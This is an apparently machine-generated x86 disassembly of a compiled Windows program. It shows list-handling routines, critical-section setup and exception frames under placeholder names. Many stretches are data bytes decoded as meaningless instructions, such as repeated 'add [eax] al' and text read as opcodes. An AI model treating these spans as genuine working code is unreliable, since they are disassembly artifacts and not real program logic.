add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
inc ecx
add [ eax - 0x67ffbe74 ] dl
mov [ ecx ] es
lodsb [ esi ]
mov eax [ ecx ]
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ edi + ecx * 4 ] bh
imul esi [ ebx + 0x74 ] 0x10746e65
pop edi
inc ecx
add [ edi ] al
adc eax 0x746e4954
jb r-xdata
add [ eax ] cl
xor [ eax ] eax
cmp al 0x8f
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
test al 0x8f
inc ecx
add [ eax - 0x47ffbe70 ] cl
nop
inc ecx
add [ eax + 0x4004190 ] dh
pop [ ecx ]
add al [ eax ]
imul esi [ ebx + 0x74 ] 0xd4746e65
pop esi
inc ecx
add [ esi + ebx * 2 ] cl
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
jae r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_415fad
inc [ eax + edx * 4 - 0x702fffbf ]
inc ecx
add [ edi ] cl
push esp
inc ebx
outsd
insb
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
dec ecx
je r-xdata
inc eax
add [ eax - 0x73ffbfcd ] bl
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ecx + edx * 4 ] dh
inc ecx
add [ eax - 0x67ffbe74 ] dl
mov [ ecx ] es
mov al [ 0xc004191 ]
xchg esi eax
inc ecx
add [ eax ] dl
xchg esi eax
inc ecx
add [ esi + edx * 4 ] dl
inc ecx
add al cl
xchg ebp eax
inc ecx
add ah cl
xchg ebp eax
inc ecx
add [ eax ] bh
xchg edx eax
inc ecx
add [ edx + edx * 4 + 0xe0041 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
add [ eax ] al
add al 0x0
std
insd
mov eax eax
int3
sub_4162cc
push cs
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
mov eax 0xb0004198
xchg edi eax
inc ecx
add [ eax ] bl
outsb
dec ecx
je r-xdata
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
imul ebp [ esi + 0x67 ] 0x7473694c
loopne r-xdata
cmpsd [ esi ] [ edi ]
inc ecx
add [ edi + 0x41 ] cl
add [ eax - 0x59 ] dl
inc ecx
add [ edi + 0x41 ] dl
add [ ebx + ebx * 4 - 0x5737ffbf ] bl
inc ecx
add [ ecx + ebp * 4 ] ah
inc ecx
add al bh
test eax 0xa2e80041
inc ecx
add [ edx + ebp * 4 ] dh
inc ecx
add [ eax - 0x33ffbe56 ] ch
movsb [ edi ] [ esi ]
inc ecx
add al bl
movsb [ edi ] [ esi ]
inc ecx
add al bh
xchg esi eax
inc ecx
add [ ebp + 0x41 ] dh
add [ ebp - 0x59dfffbf ] dh
inc ecx
add [ eax - 0x65 ] cl
inc ecx
add [ eax - 0x23ffbe59 ] dh
popfd
inc ecx
add [ eax - 0x13ffbe62 ] dh
cmpsd [ esi ] [ edi ]
inc ecx
add ah bh
cmpsd [ esi ] [ edi ]
inc ecx
add [ edi + ebx * 4 ] dl
inc ecx
add [ eax - 0x61 ] ch
inc ecx
add [ eax ] dl
inc ecx
add [ ecx - 0x5dfbffbf ] ch
inc ecx
add [ eax + 0x3c0041a2 ] bl
movsd [ edi ] [ esi ]
inc ecx
add [ eax - 0x5b ] bl
inc ecx
add [ eax - 0x58 ] dl
inc ecx
add [ eax + 0x600041a6 ] ah
stosb [ edi ]
inc ecx
add [ eax - 0x56 ] dh
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
cwde
inc ecx
add [ eax + 0x18004197 ] dh
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
cmp [ ebx + 0x41 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
arpl [ ecx ] ax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ ebx + 0x41 ] 0x1
add [ eax ] dh
add [ eax ] al
add [ ecx + 0x33840041 ] bh
inc eax
add [ eax - 0x6bffbfcd ] dl
xor eax [ eax ]
cwde
xor eax [ eax ]
add al bh
popad
stosb [ edi ]
inc ecx
add [ ebx + ebp * 4 + 0x41 ] al
add [ ebx + ebp * 4 + 0x41 ] bl
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add ah bh
stosd [ edi ]
inc ecx
add [ eax + 0x70041ac ] al
push esp
push ebx
je r-xdata
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add al bh
inc ecx
add [ edi ] al
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
push ebx
je r-xdata
popad
insd
mov eax eax
pop esp
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x65 ] bh
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax - 0x7bffbe9c ] bl
xor eax [ eax ]
nop
xor eax [ eax ]
xchg esp eax
xor eax [ eax ]
cwde
xor eax [ eax ]
stosb [ edi ]
inc ecx
add [ eax - 0x4bffbe51 ] ah
scasd [ edi ]
inc ecx
add [ edi + ebp * 4 + 0x41 ] dl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
clc
inc ecx
add [ edi ] al
pop es
push esp
push ebx
je r-xdata
clc
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
movsb [ edi ] [ esi ]
bound eax [ ecx ]
add [ eax ] al
pop es
inc ebx
insb
popad
jae r-xdata
insd
dec ebp
insd
outsd
jb r-xdata
popad
insd
shl [ ebp + 0x41 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
inc ecx
add [ eax ] dl
add [ eax ] al
add [ esp ] al
inc ecx
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
clc
stosb [ edi ]
inc ecx
add [ ebx + ebp * 4 + 0x41 ] al
add [ ebx + ebp * 4 + 0x41 ] bl
add [ eax + 0x480041b1 ] dh
sub [ eax ] eax
call 0xffffffff8041a79a
lodsb [ esi ]
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
add [ edi + ebp * 4 + 0x41 ] ah
add ah bh
stosd [ edi ]
inc ecx
add [ edi + ebp * 4 + 0x41 ] dh
add [ 0x6e614854 ] cl
push esp
scasd [ edi ]
inc ecx
popad
insd
push eax
inc ecx
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
jb r-xdata
jae r-xdata
jns r-xdata
push ebx
je r-xdata
sub [ ecx + eax * 2 + 0x41b2dc00 ] 0x0
or eax 0x6d654d54
je r-xdata
insb
push ebx
je r-xdata
outsb
jae r-xdata
add ah ch
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
insd
js r-xdata
popad
add [ ebp + 0x64500040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x41 ] ch
add [ eax + eax ] al
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
clc
stosb [ edi ]
inc ecx
add [ ebx + ebp * 4 + 0x41 ] al
add [ ebx + ebp * 4 + 0x41 ] bl
add [ eax + 0x240041b1 ] dh
mov ch 0x41
add al ch
mov cl 0x41
add [ eax + 0xf0041ac ] al
push esp
push edx
jae r-xdata
je r-xdata
outsd
jb r-xdata
insd
popad
insd
dec esp
inc cx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x41 ] ch
add [ eax + eax ] dl
add [ eax ] al
test [ ebp + 0x41 ] ah
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
or al 0xb2
inc ecx
add al bh
stosb [ edi ]
inc ecx
add [ eax + 0x5c0041b2 ] dh
stosd [ edi ]
inc ecx
add [ eax + 0x680041b1 ] dh
mov bl 0x41
add al ch
mov cl 0x41
push ebx
push ebx
add [ eax - 0x23ffbe54 ] al
mov dl 0x41
add [ 0x6d654d54 ] cl
inc ecx
add [ ebp + 0x64e40040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
add [ eax ] cl
add [ eax ] al
add [ esp ] al
inc ecx
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
outsd
popad
insd
mov eax eax
enter 0x4166 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x66
inc ecx
add [ eax ] bl
add [ eax ] al
add [ ebp + 0x33840041 ] al
inc eax
add [ eax - 0x6bffbfcd ] dl
xor eax [ eax ]
cwde
xor eax [ eax ]
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
sub_4166b9
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add ah ch
mov ah 0x41
add al bh
stosb [ edi ]
inc ecx
add [ ebx + ebp * 4 + 0x41 ] al
add [ ebx + ebp * 4 + 0x41 ] bl
add [ eax + 0x240041b1 ] dh
mov ch 0x41
add al ch
mov cl 0x41
add [ eax + 0xf0041ac ] al
push esp
push edx
jae r-xdata
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
arpl [ ebp + 0x53 ] sp
je r-xdata
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
sub_416efc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405fd0
pop edi
pop esi
pop ebx
retn
sub_416f24
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405fb4
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_416f4c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405ff0
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_416fc5
outsd
inc ecx
add [ eax + eax ] dl
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
lodsb [ esi ]
jno r-xdata
xchg esp eax
xor eax [ eax ]
cwde
xor eax [ eax ]
add [ ecx ] cl
push esp
mov [ esp + 0x4 ] edx
mov [ esp ] eax
jne r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
add al 0x89
add al 0x24
mov eax eax
dec eax
jo r-xdata
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
or [ ecx ] dh
inc eax
add ah dl
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x70 ] cl
inc ecx
add [ eax + eax ] ah
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
aam 0x74
inc ecx
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403368
test al al
je r-xdata
call sub_4185b0
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403368
test al al
je r-xdata
xlat
add [ edx ] cl
push esp
push edx
inc edi
jb r-xdata
nop
jne r-xdata
in al dx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
jae r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_417060
mov esi eax
jmp r-xdata
push edx
inc edi
jb r-xdata
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ecx + esi * 2 + 0x54090041 ] ch
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417060
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403368
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_417060
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_4185b0
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403368
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403368
test al al
je r-xdata
sub_4170c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_417060
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417060
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403368
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_417130
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403124
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_418454
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4171ac
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
mov eax [ esi + 0x4 ]
call sub_403154
mov eax [ esi + 0x8 ]
call sub_403154
mov eax [ esi + 0xc ]
call sub_403154
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_4171ec
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_4185b0
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_4030b8
test al al
jne r-xdata
sub_41724c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_4185b0
mov edx eax
mov eax ebp
call sub_403368
test al al
jne r-xdata
sub_417290
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41732b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4030a4
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041b4
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4171ec
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_418454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417332
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7a0
call sub_403908
sub_417350
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_405174
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_417370
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_4185b0
mov edx edi
call sub_417350
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4185b0
mov edx edi
call sub_417350
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_4184a0
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_417350
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4184a0
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_417414
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_4185b0
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_41724c
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_417460
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403124
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_417130
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418454
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4174d4
push ebx
push esi
push edi
push ebp
call sub_403508
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_403154
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
mov eax [ esi + 0x4 ]
mov edx edi
call sub_4185b0
call sub_403154
inc edi
dec ebp
jne r-xdata
sub_417530
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_4185b0
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_4170c0
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_417574
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_4171ec
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_4185b0
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_4175b8
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_41763b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4030a4
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6e4
call sub_403908
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417642
lea eax [ ebp - 0x10c ]
call sub_403f50
retn
sub_417648
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_417530
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_417054
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_4175b8
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_4185b0
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4185b0
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403368
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_417530
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4184a0
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_418454
sub_417734
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4185b0
mov edx ebp
call sub_417338
test al al
jne r-xdata
sub_417778
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_417130
mov edx eax
mov eax [ edi + 0x4 ]
call sub_418454
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4185b0
mov eax [ eax + 0xc ]
mov edx ebp
call sub_41860c
test eax eax
jge r-xdata
sub_4177d4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4185b0
mov esi eax
mov edx ebp
mov eax esi
call sub_417370
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_403154
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4184a0
sub_417824
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
